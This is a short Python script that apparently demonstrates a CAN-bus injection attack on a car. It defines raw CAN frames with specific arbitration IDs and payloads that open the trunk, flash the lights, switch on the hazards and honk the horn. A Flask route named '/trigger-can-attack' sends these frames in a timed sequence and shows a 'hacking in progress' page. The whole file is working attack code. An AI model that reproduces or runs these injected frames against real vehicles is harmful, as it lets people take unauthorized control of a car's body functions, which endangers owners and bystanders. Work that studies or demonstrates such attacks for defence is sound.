import can
import time
from binascii import unhexlify
from flask import Flask, render_template
from threading import Thread

app = Flask(__name__)

# ip link set can0 type can bitrate 500000
# ip link set up can0
bus = can.Bus(channel="can0", interface="socketcan")

TRUNK_OPENCLOSE = can.Message(arbitration_id=0x3B3, data=unhexlify("8A80050000006000"), is_extended_id=False)
LIGHTS_FLASH = can.Message(arbitration_id=0x3B3, data=unhexlify("8882050000006000"), is_extended_id=False)
HAZARD_LIGHTS = can.Message(arbitration_id=0x3C2, data=unhexlify("0855555500005545"), is_extended_id=False)
HONK_HORN = can.Message(arbitration_id=0x3C2, data=unhexlify("0455555500005545"), is_extended_id=False)

def perform_demo():
    time.sleep(2)

    bus.send(TRUNK_OPENCLOSE)
    time.sleep(0.1)
    bus.send(HAZARD_LIGHTS)
    time.sleep(1)

    for i in range(500):
        if i < 100:
            bus.send(HONK_HORN)
        if i % 50 == 0:
            bus.send(LIGHTS_FLASH)

        time.sleep(0.01)

    time.sleep(5)
    bus.send(HAZARD_LIGHTS)
    time.sleep(1)
    bus.send(TRUNK_OPENCLOSE)

@app.route('/')
def index():
    return 'nope'

@app.route('/trigger-can-attack')
def perform_attack():
    t = Thread(target=perform_demo, daemon=True)
    t.start()

    return render_template("hacking-in-progress.html")

if __name__ == '__main__':
    app.run(port=3000)
